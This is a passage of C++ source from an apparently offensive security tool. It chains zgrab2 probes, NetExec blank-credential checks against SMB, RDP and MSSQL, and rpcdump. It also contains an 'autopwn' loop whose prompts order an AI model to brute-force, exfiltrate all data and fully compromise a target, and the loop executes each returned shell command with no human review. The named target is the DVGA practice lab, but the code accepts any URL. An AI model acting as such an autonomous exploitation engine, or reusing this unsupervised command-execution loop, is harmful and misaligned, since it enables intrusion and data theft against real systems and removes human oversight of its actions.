            std::ofstream f(outpath, std::ios::binary);
            f << content;
            produced_files.push_back(outpath);
        } catch (...) {
            // best-effort
        }
    };

    if (ports.empty()) {
        loginfo(std::string(ansi::sky) + "[RECON] Post-naabu: no open ports, nothing to enrich." + ansi::reset);
        return;
    }

    loginfo(std::string(ansi::sky) + "[RECON] Post-naabu: protocol-aware enrichment on host " + host + ansi::reset);

    // -------- host list pour zgrab2 --------
    fs::path hostlist = workdir / "post_naabu_hosts.txt";
    bool hostlist_ok = true;
    try {
        fs::create_directories(hostlist.parent_path());
        std::ofstream hf(hostlist, std::ios::binary);
        hf << host << "\n";
    } catch (...) {
        hostlist_ok = false;
        logerr("run_post_naabu_enrichment: failed to write zgrab2 host list, zgrab2 phase skipped.");
    }

    auto has_any = [&](std::initializer_list<int> plist)->bool {
        for (int p : plist) if (ports.count(p)) return true;
        return false;
    };

    // -------- wrapper générique zgrab2 --------
    auto run_zgrab_module = [&](const std::string& module,
                                int port,
                                const std::string& extra_args,
                                const std::string& family_tag)
    {
        if (!ports.count(port)) return;
        if (!hostlist_ok)      return;

        std::string so, se;
        fs::path out_json  = workdir / ("post_naabu_" + module + "_" + std::to_string(port) + ".json");
        fs::path out_trace = workdir / ("post_naabu_" + module + "_" + std::to_string(port) + ".txt");

        std::ostringstream cmd;
        cmd << "zgrab2 " << module
            << " --port " << port
            << " --input-file " << quote(hostlist.string())
            << " --output-file " << quote(out_json.string());
        if (!extra_args.empty()) cmd << " " << extra_args;

        bool ok = run_command_capture(cmd.str(), so, se, 0, false);

        std::ostringstream header;
        header << "# FAMILY: " << family_tag << "\n"
               << "# MODULE: zgrab2/" << module << " PORT: " << port
               << " HOST: " << host << "\n"
               << "# CMD   : " << cmd.str() << "\n"
               << "# OK    : " << (ok ? "true" : "false") << "\n\n"
               << "=== STDOUT ===\n" << so << "\n\n=== STDERR ===\n" << se << "\n";

        write_out(out_trace, header.str());
        if (fs::exists(out_json)) produced_files.push_back(out_json);
    };

    // ---------- 1. HTTP(S) / Reverse proxy / WAF / API gateway / SaaS ----------
    {
        std::vector<int> http_ports = {
            80,81,82,88,
            443,4443,
            8000,8008,8080,8081,8088,
            8443,8880,8888,
            9000,9080,9090,9443
        };

        for (int p : http_ports) {
            if (!ports.count(p)) continue;
            bool https = (p == 443 || p == 4443 || p == 8443 || p == 9443);
            std::string extra = "--max-redirects 10";
            if (https) extra = "--use-https --max-redirects 10";

            // proto_http_web : couvre tout ton bloc 1–6–13–16–18–19 (stacks Web, WAF, CDN, SaaS, CI/CD HTTP, etc.)
            run_zgrab_module("http", p, extra, "proto_http_web");

            // TLS 1.0–1.3 / SNI / certif => proto_encryption + CDN/WAF/Edge
            if (https) {
                run_zgrab_module("tls", p, "--heartbleed-attempts 0", "proto_encryption");
            }
        }
    }

    // ---------- 2. Mail: SMTP/ESMTP/Submission/SMTPS + POP3/IMAP ----------
    {
        // SMTP / Submission / SMTPS
        std::vector<int> smtp_ports = {25, 465, 587, 2525};
        for (int p : smtp_ports) {
            if (!ports.count(p)) continue;
            run_zgrab_module("smtp", p, "--ehlo-name darkmoon.local", "proto_mail");
            if (p == 465) {
                run_zgrab_module("tls", p, "", "proto_mail");
            }
        }

        // POP3 / POP3S
        if (ports.count(110)) run_zgrab_module("pop3", 110, "", "proto_mail");
        if (ports.count(995)) {
            run_zgrab_module("pop3", 995, "--tls", "proto_mail");
            run_zgrab_module("tls",  995, "",       "proto_mail");
        }

        // IMAP / IMAPS
        if (ports.count(143)) run_zgrab_module("imap", 143, "", "proto_mail");
        if (ports.count(993)) {
            run_zgrab_module("imap", 993, "--tls", "proto_mail");
            run_zgrab_module("tls",  993, "",       "proto_mail");
        }
    }

    // ---------- 3. Auth / annuaires / AAA / Federation ----------
    {
        // LDAP / LDAPS / Global Catalog
        if (ports.count(389))  run_zgrab_module("banner", 389,  "", "proto_auth_aaa");
        if (ports.count(636))  run_zgrab_module("tls",    636,  "", "proto_auth_aaa");
        if (ports.count(3268)) run_zgrab_module("banner", 3268, "", "proto_auth_aaa");
        if (ports.count(3269)) run_zgrab_module("tls",    3269, "", "proto_auth_aaa");

        // Kerberos
        if (ports.count(88))   run_zgrab_module("banner", 88,   "", "proto_auth_aaa");

        // RADIUS
        if (ports.count(1812)) run_zgrab_module("banner", 1812, "", "proto_auth_aaa");
        if (ports.count(1813)) run_zgrab_module("banner", 1813, "", "proto_auth_aaa");

        // TACACS(+)
        if (ports.count(49))   run_zgrab_module("banner", 49,   "", "proto_auth_aaa");
    }

    // ---------- 4. Remote access & shells (SSH/Telnet/RDP/VNC/WinRM) ----------
    {
        // SSH / SFTP
        std::vector<int> ssh_ports = {22, 2222};
        for (int p : ssh_ports) {
            if (ports.count(p)) run_zgrab_module("ssh", p, "", "proto_remote_access");
        }

        // Telnet
        if (ports.count(23)) run_zgrab_module("telnet", 23, "", "proto_remote_access");

        // RDP
        if (ports.count(3389)) run_zgrab_module("rdp", 3389, "", "proto_remote_access");

        // VNC (ports standards)
        for (int p = 5900; p <= 5905; ++p) {
            if (ports.count(p)) run_zgrab_module("banner", p, "", "proto_remote_access");
        }

        // WinRM 5985 HTTP / 5986 HTTPS
        if (ports.count(5985))
            run_zgrab_module("http", 5985, "--max-redirects 5", "proto_remote_access");
        if (ports.count(5986)) {
            run_zgrab_module("http", 5986, "--use-https --max-redirects 5", "proto_remote_access");
            run_zgrab_module("tls",  5986, "", "proto_encryption");
        }
    }

    // ---------- 5. Bases SQL (MySQL, PostgreSQL, MSSQL, Oracle, Db2, …) ----------
    {
        if (ports.count(3306)) run_zgrab_module("mysql",   3306, "", "proto_db_sql");   // MySQL / MariaDB / Percona
        if (ports.count(5432)) run_zgrab_module("postgres",5432, "", "proto_db_sql");   // PostgreSQL / TimescaleDB
        if (ports.count(1433)) run_zgrab_module("mssql",   1433, "", "proto_db_sql");   // MS SQL Server
        if (ports.count(1521)) run_zgrab_module("banner",  1521, "", "proto_db_sql");   // Oracle Net
        if (ports.count(50000))run_zgrab_module("banner",  50000,"", "proto_db_sql");   // Db2
    }

    // ---------- 6. Bases NoSQL / Timeseries / Search ----------
    {
        if (ports.count(27017)) run_zgrab_module("mongodb",   27017, "", "proto_db_nosql"); // MongoDB
        if (ports.count(6379))  run_zgrab_module("redis",     6379,  "", "proto_db_nosql"); // Redis / Redis Streams
        if (ports.count(11211)) run_zgrab_module("memcached", 11211, "", "proto_db_nosql");

        // Cassandra (CQL)
        if (ports.count(9042))  run_zgrab_module("banner", 9042, "", "proto_db_nosql");

        // Elasticsearch / OpenSearch / Solr (HTTP)
        if (ports.count(9200))  run_zgrab_module("http", 9200, "--max-redirects 3", "proto_db_nosql");
        if (ports.count(9201))  run_zgrab_module("http", 9201, "--max-redirects 3", "proto_db_nosql");
        if (ports.count(8983))  run_zgrab_module("http", 8983, "--max-redirects 3", "proto_db_nosql"); // Solr

        // Timeseries exposées en HTTP : InfluxDB, Prometheus, OpenTSDB, VictoriaMetrics
        std::vector<int> ts_ports = {8086, 9090, 4242, 8428};
        for (int p : ts_ports) {
            if (ports.count(p))
                run_zgrab_module("http", p, "--max-redirects 3", "proto_db_nosql");
        }
    }

    // ---------- 7. Message brokers / queues / streaming ----------
    {
        // AMQP / RabbitMQ
        if (ports.count(5672)) run_zgrab_module("amqp",   5672, "",     "proto_message_bus");
        if (ports.count(5671)) run_zgrab_module("tls",    5671, "",     "proto_encryption"); // AMQP/TLS

        // MQTT
        if (ports.count(1883)) run_zgrab_module("mqtt",   1883, "",     "proto_message_bus");
        if (ports.count(8883)) run_zgrab_module("mqtt",   8883, "--tls","proto_message_bus");

        // Kafka
        if (ports.count(9092)) run_zgrab_module("kafka",  9092, "",     "proto_message_bus");

        // STOMP / NATS / XMPP etc -> banner générique
        if (ports.count(61613))run_zgrab_module("banner", 61613, "", "proto_message_bus"); // STOMP
        if (ports.count(4222)) run_zgrab_module("banner", 4222,  "", "proto_message_bus"); // NATS
    }

    // ---------- 8. Fichiers / shares / object storage ----------
    {
        // FTP / FTPS
        if (ports.count(21))  run_zgrab_module("ftp", 21,  "",                 "proto_file_transfer");
        if (ports.count(990)) run_zgrab_module("ftp", 990, "--implicit-tls",   "proto_file_transfer");

        // SMB / CIFS
        if (ports.count(445)) run_zgrab_module("smb", 445, "", "proto_fileshare");
        if (ports.count(139)) run_zgrab_module("smb", 139, "", "proto_fileshare");

        // NFS / AFP / iSCSI (bannières)
        if (ports.count(2049))run_zgrab_module("banner", 2049, "", "proto_fileshare"); // NFS
        if (ports.count(548)) run_zgrab_module("banner", 548,  "", "proto_fileshare"); // AFP
        if (ports.count(3260))run_zgrab_module("banner", 3260, "", "proto_fileshare"); // iSCSI

        // WebDAV / Nextcloud / ownCloud / SharePoint / Samba Web / etc. via HTTP
        std::vector<int> dav_ports = {80,443,8080,8443};
        for (int p : dav_ports) {
            if (!ports.count(p)) continue;
            std::string extra = (p == 443 || p == 8443)
                ? "--use-https --max-redirects 5"
                : "--max-redirects 5";
            run_zgrab_module("http", p, extra, "proto_file_transfer");
        }

        // S3 / MinIO / GCS / Azure Blob / Spaces / B2 / Wasabi (HTTP/S)
        std::vector<int> s3_ports = {443,8443,9000};
        for (int p : s3_ports) {
            if (!ports.count(p)) continue;
            std::string extra = (p == 443 || p == 8443)
                ? "--use-https --max-redirects 3"
                : "--max-redirects 3";
            run_zgrab_module("http", p, extra, "proto_file_transfer");
        }
    }

    // ---------- 9. VPN web portals / proxies / bastions ----------
    {
        // Fortinet SSL VPN, Pulse Secure, GlobalProtect, Guacamole, Zscaler, etc. (HTTPS)
        std::vector<int> vpn_ports = {443,8443,10443,9443};
        for (int p : vpn_ports) {
            if (!ports.count(p)) continue;
            std::string extra = "--use-https --max-redirects 3";
            run_zgrab_module("http", p, extra, "proto_vpn_tunnel");
            run_zgrab_module("tls",  p, "",    "proto_encryption");
        }

        // HTTP proxies (Squid, Blue Coat, Symantec Proxy, Zscaler, etc.)
        std::vector<int> proxy_ports = {3128,8080,8000,8888};
        for (int p : proxy_ports) {
            if (!ports.count(p)) continue;
            run_zgrab_module("http", p, "--max-redirects 3", "proto_http_web");
        }
    }

    // ---------- 10. ICS / OT ----------
    {
        if (ports.count(502))    run_zgrab_module("modbus", 502,   "", "proto_ics_ot");   // Modbus/TCP
        if (ports.count(20000))  run_zgrab_module("banner", 20000, "", "proto_ics_ot");   // DNP3
        if (ports.count(2404))   run_zgrab_module("banner", 2404,  "", "proto_ics_ot");   // IEC 60870-5-104
        if (ports.count(102))    run_zgrab_module("banner", 102,   "", "proto_ics_ot");   // IEC 61850 / MMS
        if (ports.count(47808))  run_zgrab_module("banner", 47808, "", "proto_ics_ot");   // BACnet/IP
    }

    // ---------- 11. Supervision / logs / gestion réseau ----------
    {
        // SNMP (canonicalement UDP, on tente un fallback TCP quand même)
        if (ports.count(161)) run_zgrab_module("banner", 161, "", "proto_supervision");
        if (ports.count(162)) run_zgrab_module("banner", 162, "", "proto_supervision");
        // NetFlow / IPFIX / sFlow restent plutôt UDP -> hors scope TCP ici.
    }

    // ---------- 12. Divers: IPMI / TOR / Redfish / MQTT over WS ----------
    {
        if (ports.count(623))   run_zgrab_module("banner", 623,  "", "proto_supervision");   // IPMI (rare en TCP)
        if (ports.count(8008))  run_zgrab_module("http",   8008, "--max-redirects 3", "proto_http_web"); // Redfish alt
        if (ports.count(9050))  run_zgrab_module("banner", 9050, "", "proto_vpn_tunnel");    // Tor SOCKS
        if (ports.count(9051))  run_zgrab_module("banner", 9051, "", "proto_vpn_tunnel");    // Tor control
    }

    // ---------- 13. Legacy Web / CGI / ColdFusion / Lotus / Domino ----------
    // Couvert par les modules HTTP/TLS plus haut (whatweb + nuclei feront le reste).

    // ---------- 14. Enrichissement NetExec / Impacket AD / RDP / MSSQL ----------
    std::string so, se;

    if (!ports.empty() && (ports.count(445) || ports.count(139) || ports.count(135))) {
        loginfo(std::string(ansi::sky) + "[RECON] Post-naabu: SMB/AD enrichment (NetExec + rpcdump) on " + host + ansi::reset);

        so.clear(); se.clear();
        run_command_capture("netexec smb " + host + " -u '' -p '' --shares", so, se, 0, false);
        write_out(workdir / "recon_smb_netexec.txt", so + "\n" + se);

        so.clear(); se.clear();
        run_command_capture("rpcdump.py @" + host, so, se, 0, false);
        write_out(workdir / "recon_rpcdump.txt", so + "\n" + se);
    }

    if (ports.count(3389)) {
        loginfo(std::string(ansi::sky) + "[RECON] Post-naabu: RDP enrichment (NetExec) on " + host + ansi::reset);
        so.clear(); se.clear();
        run_command_capture("netexec rdp " + host + " -u '' -p ''", so, se, 0, false);
        write_out(workdir / "recon_rdp_netexec.txt", so + "\n" + se);
    }

    if (ports.count(1433)) {
        loginfo(std::string(ansi::sky) + "[RECON] Post-naabu: MSSQL enrichment (NetExec) on " + host + ansi::reset);
        so.clear(); se.clear();
        run_command_capture("netexec mssql " + host + " -u sa -p '' --instances", so, se, 0, false);
        write_out(workdir / "recon_mssql_netexec.txt", so + "\n" + se);
    }
    // --- Phase 2 Infra : validation / confirmation automatique --------------
    std::vector<int> open_ports(ports.begin(), ports.end());
    run_infra_validation_phase(host, open_ports, workdir, produced_files);
}


// -----------------------------------------------------------------------------
// Config globale de scan (multi-target / profils / tuning naabu)
// -----------------------------------------------------------------------------
struct ScanConfig {
    // Multi-target / orchestration
    std::vector<std::string> extra_targets;   // --target (plusieurs cibles CLI)
    std::string              targets_file;    // --targets-file
    std::string              default_scheme = "https"; // pour les lignes sans scheme

    // Profil de ports
    // "full" => 1-65535
    // "web"  => ports HTTP(S) / applis
    // "mail" => SMTP/POP/IMAP
    // "db"   => SQL / DB
    // "infra"=> ssh, rdp, smb, etc.
    // autre  => profil custom que tu traites côté parse_cli/main
    std::string scan_profile = "full";

    // Si renseigné, on passe cette expression directement à naabu (-p / -ports)
    // ex: "80,443,8000-8100,u:53"
    std::string custom_ports;

    // UDP basique (DNS/NTP/SNMP/IKE…)
    bool enable_udp = false;                  // --enable-udp

    // Tuning Naabu
    // - si auto_tune = true et que rate/retries n'ont pas été overridés,
    //   on ajuste un peu dans run_recon_web_chain
    bool auto_tune = false;                   // --naabu-auto-tune

    // Si > 0 => passé tel quel à -rate. Si <= 0 => laisse naabu décider.
    int  naabu_rate    = 20000;               // par défaut 20000 comme avant

    // Si >= 0 => passé tel quel à -retries. Si < 0 => laisse naabu décider.
    int  naabu_retries = 2;                   // par défaut 2 comme avant

    // "", "100", "1000", "full" (si non vide et != "full" => -top-ports)
    std::string naabu_top_ports;

    // Re-scan ciblé (2e passe naabu sur ports intéressants)
    bool enable_rescan = true;                // --no-rescan / --disable-rescan pour désactiver
};

// Instance globale
static ScanConfig g_scan_conf;

// Ports "critiques" qui méritent un second regard si le réseau est flaky
static const uint16_t HIGH_VALUE_PORTS[] = {
    22, 80, 81, 443, 445, 3389, 5900,
    8080, 8081, 8088, 8443,
    1433, 1521, 3306, 5432,
    6379, 11211, 27017, 27018
};

// 2e passe Naabu plus lente sur un petit set de ports
static bool run_naabu_rescan(const std::string &host,
                             const fs::path &workdir,
                             const std::vector<uint16_t> &known_open,
                             std::vector<uint16_t> &new_ports_out)
{
    // On restreint aux ports "haut intérêt"
    std::vector<uint16_t> candidates;
    for (uint16_t p : known_open) {
        for (uint16_t hv : HIGH_VALUE_PORTS) {
            if (p == hv) {
                candidates.push_back(p);
                break;
            }
        }
    }

    if (candidates.empty()) {
        return true; // rien à rescanner
    }

    fs::path rescan_file = workdir / "naabu_rescan_ports.txt";

    std::ostringstream ports_expr;
    for (size_t i = 0; i < candidates.size(); ++i) {
        if (i) ports_expr << ",";
        ports_expr << candidates[i];
    }

    int base_rate    = (g_scan_conf.naabu_rate    > 0) ? g_scan_conf.naabu_rate    : 20000;
    int base_retries = (g_scan_conf.naabu_retries >= 0) ? g_scan_conf.naabu_retries : 2;

    int rate    = std::max(500, base_rate / 10);      // beaucoup plus lent
    int retries = std::max(base_retries + 1, 3);      // + de retries

    std::ostringstream cmd;
    cmd << "naabu -host " << host
        << " -p " << ports_expr.str()
        << " -no-color -silent"
        << " -rate " << rate
        << " -retries " << retries
        << " -timeout 500"
        << " -o " << rescan_file.string();

    {
        ScopedBanner banner("Naabu targeted rescan (high-value ports)");
        if (!run_command_logged(cmd.str(), workdir, "naabu_rescan.log")) {
            std::cerr << "[-] Naabu rescan failed (continuing anyway)\n";
            return false;
        }
    }

    // On parse le fichier de rescan avec la même fonction
    std::set<int> rescan_set = parse_naabu_ports(rescan_file);
    std::vector<uint16_t> rescan_ports;
    for (int p : rescan_set) {
        if (p > 0 && p <= 65535) {
            rescan_ports.push_back(static_cast<uint16_t>(p));
        }
    }

    // On ne garde que les ports nouveaux par rapport à la première passe
    for (uint16_t p : rescan_ports) {
        if (std::find(known_open.begin(), known_open.end(), p) == known_open.end()) {
            new_ports_out.push_back(p);
        }
    }

    return true;
}

// ============================================================================
// Helper: extraire la première URL présente dans une commande shell
// ============================================================================
static std::string extract_first_url(const std::string &cmd)
{
    const char* schemes[] = {"http://", "https://"};
    size_t best = std::string::npos;
    const char* chosen = nullptr;

    for (auto s : schemes) {
        size_t p = cmd.find(s);
        if (p != std::string::npos && (best == std::string::npos || p < best)) {
            best = p;
            chosen = s;
        }
    }
    if (!chosen) return {};

    size_t i = best;
    while (i < cmd.size()) {
        char c = cmd[i];
        if (c == ' ' || c == '"' || c == '\'' || c == '\t' || c == '\n' || c == '\r')
            break;
        i++;
    }

    return cmd.substr(best, i - best);
}

// ============================================================================
// Helper: extraire la VRAIE commande shell depuis la sortie du MCP
// ============================================================================
static std::string extract_shell_command(const std::string &raw)
{
    // 1. Si MCP renvoie un bloc ```…```
    size_t b = raw.find("```");
    if (b != std::string::npos) {
        size_t e = raw.find("```", b + 3);
        if (e != std::string::npos) {
            std::string inside = raw.substr(b + 3, e - (b + 3));
            std::istringstream iss(inside);
            std::string line;
            while (std::getline(iss, line)) {
                // trim
                while (!line.empty() && (line.back() == ' ' || line.back() == '\t' || line.back() == '\r'))
                    line.pop_back();
                size_t i = 0;
                while (i < line.size() && (line[i] == ' ' || line[i] == '\t'))
                    i++;
                if (i < line.size()) return line.substr(i);
            }
        }
    }

    // 2. Sinon, première ligne "non vide"
    std::istringstream iss(raw);
    std::string line;
    while (std::getline(iss, line)) {
        while (!line.empty() && (line.back() == ' ' || line.back() == '\t' || line.back() == '\r'))
            line.pop_back();
        size_t i = 0;
        while (i < line.size() && (line[i] == ' ' || line[i] == '\t'))
            i++;
        if (i < line.size()) return line.substr(i);
    }

    return {};
}

// ============================================================================
// Helper: réécriture AUTOMATIQUE des URL mortes vers la dernière bonne URL
// ============================================================================
static std::string rewrite_with_last_good_url(const std::string &cmd,
                                              const std::string &last_good,
                                              const std::vector<std::string> &bad)
{
    if (last_good.empty()) return cmd;

    std::string url = extract_first_url(cmd);
    if (url.empty()) return cmd;

    bool dead = false;
    for (auto &b : bad) {
        if (b == url) { dead = true; break; }
    }

    if (!dead) return cmd;

    std::cout << ansi::yellow
              << "[DVGA] rewrite_with_last_good_url: " << url
              << " → " << last_good
              << ansi::reset << std::endl;

    std::string res = cmd;
    size_t pos = 0;
    while ((pos = res.find(url, pos)) != std::string::npos) {
        res.replace(pos, url.size(), last_good);
        pos += last_good.size();
    }

    return res;
}
/*
static bool run_graphql_autopwn_mcp(const AgentOptions &opt,
                                    const fs::path &workdir)
{
    if (opt.mcp_path.empty()) {
        logerr("run_graphql_autopwn_mcp: mcp_path vide");
        return false;
    }
    if (opt.baseurl.empty()) {
        logerr("run_graphql_autopwn_mcp: baseurl vide");
        return false;
    }

    try { fs::create_directories(workdir); }
    catch (...) {}

    fs::path prompt_file     = workdir / "dvga_prompt.txt";
    fs::path mcp_raw_log     = workdir / "dvga_mcp_raw.log";
    fs::path mcp_history_log = workdir / "dvga_mcp_history.txt";
    fs::path steps_log       = workdir / "dvga_steps.log";

    std::ofstream steps(steps_log);
    std::ofstream hist(mcp_history_log);

    // --------------------------------------------------------------------
    // PROMPT BASE
    // --------------------------------------------------------------------
    std::string base_prompt =
        "Tu es un moteur GRAPHQL AUTONOME conçu pour résoudre DVGA 100% automatiquement.\n"
        "Endpoint GraphQL CIBLE : " + opt.baseurl + "graphql\n"
        "TU DOIS toujours utiliser cet endpoint EXACT.\n"
        "Jamais localhost.\n"
        "Jamais un autre port.\n"
        "Mode: BLACKBOX COMPLET.\n"
        "Contraintes:\n"
        "- Tu ne renvoies STRICTEMENT QU’UNE SEULE commande shell POSIX.\n"
        "- AUCUN texte. AUCUN markdown. AUCUN commentaire.\n"
        "- Tu adaptes ta stratégie selon l’historique.\n"
        "- Tu dois découvrir l’endpoint /graphql, introspecter, brute-forcer, créer un user si nécessaire, exfiltrer toutes les données.\n"
        "- Ton but final : compromission complète DVGA.\n"
        "- Quand tu as terminé, renvoie EXACTEMENT : echo \"DVGA_AUTOPWN_DONE\"\n"
        "\n"
        "Voici l’historique STRICT, nettoyé, sans bruit :\n"
        "<full_history>\n";

    auto sanitize = [&](const std::string &raw) {
        std::string out;
        for (auto &c : raw) {
            if (c >= 32 || c == '\n' || c == '\t')
                out += c;
        }
        return out;
    };

    std::string full_history;
    std::string last_cmd1, last_cmd2;
    const int MAX_STEPS = 60;

    for (int step = 0; step < MAX_STEPS; step++)
    {
        // ------------------------------------------------------------
        // Écriture du prompt propre → NO BANNER, NO ASCII, NO ZAP
        // ------------------------------------------------------------
        std::ostringstream prompt;
        prompt << base_prompt
               << full_history
               << "\n</full_history>\n"
               << "Commande suivante :";

        {
            std::ofstream pf(prompt_file, std::ios::binary);
            pf << prompt.str();
        }

        // ------------------------------------------------------------
        // APPEL MCP (RAW LOG SÉPARÉ)
        // ------------------------------------------------------------
        std::ostringstream mcp_cmd;
        mcp_cmd << quote(opt.mcp_path.string())
                << " --engine web"
                << " --chat-file " << quote(prompt_file.string())
                << " --log "       << quote(mcp_raw_log.string())
                << " --system "    << quote(base_prompt);

        std::string out_mcp, err_mcp;
        bool ok = run_command_capture(mcp_cmd.str(), out_mcp, err_mcp, 180000, false);
        if (!ok) { logerr("MCP ERROR"); return false; }

        std::string raw_response = out_mcp + "\n" + err_mcp;

        // ------------------------------------------------------------
        // Extraire commande POSIX
        // ------------------------------------------------------------
        std::string next_cmd = extract_shell_command(raw_response);
        next_cmd = sanitize(next_cmd);

        if (next_cmd.empty()) {
            logerr("MCP n’a rien renvoyé");
            return false;
        }

        // STOP
        if (next_cmd.find("DVGA_AUTOPWN_DONE") != std::string::npos) {
            std::cout << ansi::green << "[DVGA] --> FIN REELLE" << ansi::reset << std::endl;
            return true;
        }

        // ------------------------------------------------------------
        // Rejet des commandes répétées
        // ------------------------------------------------------------
        if (next_cmd == last_cmd1 || next_cmd == last_cmd2) {
            full_history += "[REJECT: repetition] " + next_cmd + "\n";
            continue;
        }

        // ------------------------------------------------------------
        // Execute commande
        // ------------------------------------------------------------
        std::string out, err;
        run_command_capture(next_cmd, out, err, 120000, false);

        std::string full = sanitize(out + "\n" + err);

        // Steps Log
        if (steps) {
            steps << "===== STEP " << step << " =====\n"
                  << "CMD: " << next_cmd << "\n"
                  << "OUTPUT:\n" << full << "\n\n";
        }

        // MCP HISTORY LOG (débridé)
        if (hist) {
            hist << "\n[STEP " << step << "]\n"
                 << "CMD: " << next_cmd << "\n"
                 << "OUTPUT:\n" << full << "\n";
        }

        // Historique filtré pour MCP
        full_history += "CMD=" + next_cmd + "\nOUT=\n" + full + "\n";

        last_cmd2 = last_cmd1;
        last_cmd1 = next_cmd;
    }

    logerr("MAX_STEPS atteint sans succès");
    return false;
}*/

// =====================================================================
//  MOTEUR MCP AUTOPWN WEB/API (GraphQL + REST + SQLi + XSS + SSRF, etc.)
//  -> consomme tous les artefacts du workdir (Katana, FFUF, nuclei, ZAP…)
// =====================================================================
static bool run_api_web_autopwn_mcp(const AgentOptions &opt,
                                    const fs::path &workdir)
{
    if (opt.mcp_path.empty()) {
        logerr("run_api_web_autopwn_mcp: mcp_path vide");
        return false;
    }
    if (opt.baseurl.empty()) {
        logerr("run_api_web_autopwn_mcp: baseurl vide");
        return false;
    }

    try { fs::create_directories(workdir); }
    catch (...) {}

    // On garde les mêmes noms de fichiers pour ne rien casser
    fs::path prompt_file     = workdir / "dvga_prompt.txt";
    fs::path mcp_raw_log     = workdir / "dvga_mcp_raw.log";
    fs::path mcp_history_log = workdir / "dvga_mcp_history.txt";
    fs::path steps_log       = workdir / "dvga_steps.log";

    std::ofstream steps(steps_log);
    std::ofstream hist(mcp_history_log);

    // --------------------------------------------------------------------
    // 1) Construction d’un CONTEXTE RECON compact à partir des fichiers
    //    - recon_katana_urls_ok.txt
    //    - recon_ffuf_*
    //    - recon_nuclei.txt et tout ce qui contient "nuclei"
    //    - alerts_filtered.json
    //    - mcp_urls_*.json
    //    - target_score.json
    //    - tout ce qui contient "arjun"
    // --------------------------------------------------------------------
    auto safe_read_small = [&](const fs::path &p) -> std::string {
        std::string raw;
        try {
            raw = readFile(p.string());
        } catch (...) {
            return std::string("[[ERROR reading file: ") + p.filename().string() + "]]\n";
        }
        // On limite la taille pour éviter d’exploser le prompt
        const size_t MAX_PER_FILE = 16 * 1024; // 16 KB
        if (raw.size() > MAX_PER_FILE) {
            raw.resize(MAX_PER_FILE);
            raw += "\n[[TRONQUE...]]\n";
        }
        return raw;
    };

    auto has_substr = [](const std::string &s, const std::string &needle)->bool {
        return s.find(needle) != std::string::npos;
    };

    std::vector<fs::path> recon_files;
    try {
        for (const auto &entry : fs::directory_iterator(workdir)) {
            if (!entry.is_regular_file()) continue;
            fs::path p = entry.path();
            std::string name = p.filename().string();

            if (name == "recon_katana_urls_ok.txt" ||
                name == "recon_nuclei.txt" ||
                name == "alerts_filtered.json" ||
                name == "target_score.json" ||
                (has_substr(name, "recon_ffuf_")) ||
                (has_substr(name, "nuclei")) ||
                (has_substr(name, "mcp_urls_") && p.extension() == ".json") ||
                (has_substr(name, "arjun")))
            {
                recon_files.push_back(p);
            }
        }
    } catch (...) {
        logerr("run_api_web_autopwn_mcp: directory_iterator failed on workdir");
    }

    std::sort(recon_files.begin(), recon_files.end());

    std::string recon_context;
    for (const auto &p : recon_files) {
        recon_context += "===== " + p.filename().string() + " =====\n";
        recon_context += safe_read_small(p);
        recon_context += "\n\n";
    }
    if (recon_context.empty()) {
        recon_context = "[[AUCUN FICHIER DE RECON TROUVE DANS LE WORKDIR]]\n";
    }
    
    // --------------------------------------------------------------------
    // 2) PROMPTS MCP
    // --------------------------------------------------------------------

    // system_prompt = rôle global minimal (obligatoire)
    std::string system_prompt =
        "Tu es un moteur d'exploitation WEB/API AUTONOME.\n"
        "Tu ne renvoies qu'une seule commande shell POSIX par réponse.\n"
        "Jamais d'explication, jamais de commentaire, jamais de texte superflu.\n"
        "Tu restes strictement sur le host/port de la cible.\n"
        "Quand tu as totalement compromis la cible : echo \"DVGA_AUTOPWN_DONE\".\n";

    // 2.a) Charger le corps de prompt externe (bespoke)
    std::string bespoke_body;
    if (!opt.mcp_autopwn_prompt_file.empty()) {
        try {
            bespoke_body = readFile(opt.mcp_autopwn_prompt_file.string());
        } catch (const std::exception &ex) {
            logerr(std::string("run_api_web_autopwn_mcp: echec lecture prompt MCP externe '")
                   + opt.mcp_autopwn_prompt_file.string() + "': " + ex.what());
            bespoke_body.clear();
        } catch (...) {
            logerr(std::string("run_api_web_autopwn_mcp: echec lecture prompt MCP externe '")
                   + opt.mcp_autopwn_prompt_file.string() + "'");
            bespoke_body.clear();
        }
    }

    if (bespoke_body.empty()) {
        logerr("run_api_web_autopwn_mcp: aucun prompt MCP externe fourni (--prompt-file) ou fichier vide/illisible");
        return false;
    }

    // 2.b) Construire base_prompt = header fixe + prompt bespoke + <recon> + <full_history>
    std::string base_prompt;
    base_prompt.reserve(4096);

    // Header minimal (tu peux l’adapter si tu veux enlever la mention DVGA)
    base_prompt += "🛰  MODE DVGA_EXTREME_AUTOPWN_CHALLENGES\n";
    base_prompt += "CIBLE WEB/API PRINCIPALE : " + opt.baseurl + "\n";
    base_prompt += "Tu dois rester STRICTEMENT et EXCLUSIVEMENT sur CE host/port.\n";
    base_prompt += "INTERDIT : localhost, 127.0.0.1, autres domaines, autres ports.\n";
    base_prompt += "\n";

    // Corps externe
    base_prompt += bespoke_body;
    base_prompt += "\n\n";

    // Contexte de recon
    base_prompt += "RECON CENTRALISÉ :\n";
    base_prompt += "<recon>\n";
    base_prompt += recon_context;
    base_prompt += "\n</recon>\n\n";

    // Historique incrémental
    base_prompt += "HISTORIQUE COMPLET :\n";
    base_prompt += "<full_history>\n";


    auto sanitize = [&](const std::string &raw) {
        std::string out;
        out.reserve(raw.size());
        for (unsigned char c : raw) {
            if (c >= 32 || c == '\n' || c == '\t')
                out.push_back((char)c);
        }
        return out;
    };

    std::string full_history;
    std::string last_cmd1, last_cmd2;
    const int MAX_STEPS = 60;

    for (int step = 0; step < MAX_STEPS; step++)
    {
        // ------------------------------------------------------------
        // 2.a) Écriture du prompt de chat (avec historique)
        // ------------------------------------------------------------
        std::ostringstream prompt;
        prompt << base_prompt
               << full_history
               << "\n</full_history>\n"
               << "Commande suivante (UNE SEULE, shell POSIX, sans commentaire) :";

        {
            std::ofstream pf(prompt_file, std::ios::binary);
            pf << prompt.str();
        }

        // ------------------------------------------------------------
        // 2.b) APPEL MCP (RAW LOG SÉPARÉ)
        // ------------------------------------------------------------
        std::ostringstream mcp_cmd;
        mcp_cmd << quote(opt.mcp_path.string())
                << " --engine web"
                << " --chat-file " << quote(prompt_file.string())
                << " --log "       << quote(mcp_raw_log.string())
                << " --system "    << quote(system_prompt);

        std::string out_mcp, err_mcp;
        bool ok = run_command_capture(mcp_cmd.str(), out_mcp, err_mcp, 180000, false);
        if (!ok) {
